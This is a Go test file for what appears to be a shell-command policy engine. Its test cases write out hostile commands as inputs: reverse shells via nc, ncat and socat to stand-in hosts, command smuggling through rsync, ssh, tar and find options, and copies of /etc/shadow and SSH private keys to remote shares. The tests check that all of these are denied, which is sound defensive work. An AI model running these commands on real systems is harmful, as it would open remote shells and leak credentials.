package policy_test

import (
	"testing"

	"github.com/v0lka/flowsh/api"
	"github.com/v0lka/flowsh/engine"
	"github.com/v0lka/flowsh/policy"
)

// analyzeOK analyses src through the public embedding surface.
func analyzeOK(t *testing.T, lang api.Lang, src string) *api.Report {
	t.Helper()
	rep, err := api.Analyze(lang, src)
	if err != nil {
		t.Fatalf("analyze %q: %v", src, err)
	}
	return rep
}

// mustDecide evaluates rep under cfg and requires the given action.
func mustDecide(t *testing.T, cfg policy.Config, rep *api.Report, want policy.Action, what string) {
	t.Helper()
	p, err := policy.New(cfg)
	if err != nil {
		t.Fatalf("policy.New: %v", err)
	}
	if got := p.Evaluate(rep); got.Action != want {
		t.Errorf("%s: decision %s, want %s (matches=%v, effects=%v)",
			what, got.Action, want, got.Matches, rep.Effects)
	}
}

// TestFinding080ExecValuedOptionsAreDenied pins the decision the finding is
// about: a policy that denies code execution must deny every exec-valued option
// spelling, not only the ones whose row happened to declare CodeExec.
func TestFinding080ExecValuedOptionsAreDenied(t *testing.T) {
	execDeny := policy.Config{Effects: map[engine.EffectKind]policy.Action{
		engine.KindCodeExec: policy.Deny,
	}}
	for _, src := range []string{
		`rsync -e "sh -c id" src evil.example:dest`,
		`rsync --rsh "sh -c id" src evil.example:dest`,
		`rsync --rsync-path "sh -c id" src evil.example:dest`,
		`tar --rsh-command "sh -c id" -xf a.tar`,
		`tar --to-command "sh -c id" -xf a.tar`,
		`ssh -o ProxyCommand="sh -c id" evil.example`,
		`socat EXEC:/bin/sh tcp-connect:evil:4444`,
		`nc evil 4444 -e /bin/sh`,
		`ncat evil 4444 --exec /bin/sh`,
		`scp -S /tmp/evil a evil.example:b`,
		`find . -exec /tmp/evil {} ;`,
		`virtualenv -p /tmp/evil venv`,
	} {
		mustDecide(t, execDeny, analyzeOK(t, api.LangBash, src), policy.Deny, src)
	}
	// The control the finding compares against stays denied too.
	mustDecide(t, execDeny, analyzeOK(t, api.LangBash, `sort --compress-program=id f`),
		policy.Deny, "sort --compress-program")
}

// TestFinding081RemoteWriteIsDenied pins the decision for a credential copied
// to a UNC share: the default configuration (whose Exfiltration rule is Deny)
// and an explicit Exfiltration: Deny both refuse it, in both dialects.
func TestFinding081RemoteWriteIsDenied(t *testing.T) {
	exfilDeny := policy.Config{Exfiltration: policy.Deny}
	for _, c := range []struct {
		lang api.Lang
		src  string
	}{
		{api.LangBash, `cp /etc/shadow //e.test/share/x`},
		{api.LangBash, `tee //e.test/share/x < /etc/shadow`},
		{api.LangPowerShell, `Move-Item C:\Users\a\.ssh\id_rsa \\e.test\share\x`},
		{api.LangPowerShell, `Copy-Item C:\Users\a\.ssh\id_rsa \\e.test\share\x`},
	} {
		rep := analyzeOK(t, c.lang, c.src)
		mustDecide(t, exfilDeny, rep, policy.Deny, c.src)
		mustDecide(t, policy.Config{}, rep, policy.Deny, c.src+" (default config)")
	}

	// A local copy of the same file stays allowed by the exfiltration rule: the
	// control that localises the rule to the remote destination.
	rep := analyzeOK(t, api.LangBash, `cp /etc/shadow /tmp/x`)
	mustDecide(t, exfilDeny, rep, policy.Allow, `cp /etc/shadow /tmp/x`)
}
